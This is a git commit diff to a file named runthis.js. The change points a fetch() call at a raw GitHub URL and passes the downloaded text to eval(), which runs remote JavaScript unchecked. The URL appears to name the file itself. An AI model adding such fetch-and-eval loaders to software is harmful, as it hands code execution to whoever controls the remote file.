6316864195b94811194c94679fbe080b438936f5
xTymezzAlt <fete3712@gmail.com>
2026-06-24 17:57:30 +0200

    thunderz 2

--- riot/js/thunderz/runthis.js
+++ riot/js/thunderz/runthis.js
@@ -1,6 +1,6 @@
-fetch("https://example.com/script.js")
+fetch("https://raw.githubusercontent.com/fete3712-vmX/Something/refs/heads/main/riot/js/thunderz/runthis.js")
   .then(res => res.text())
-    .then(code => {
-        eval(code);
-          })
-            .catch(err => console.error(err));
+  .then(code => {
+    eval(code);
+   })
+  .catch(err => console.error(err));
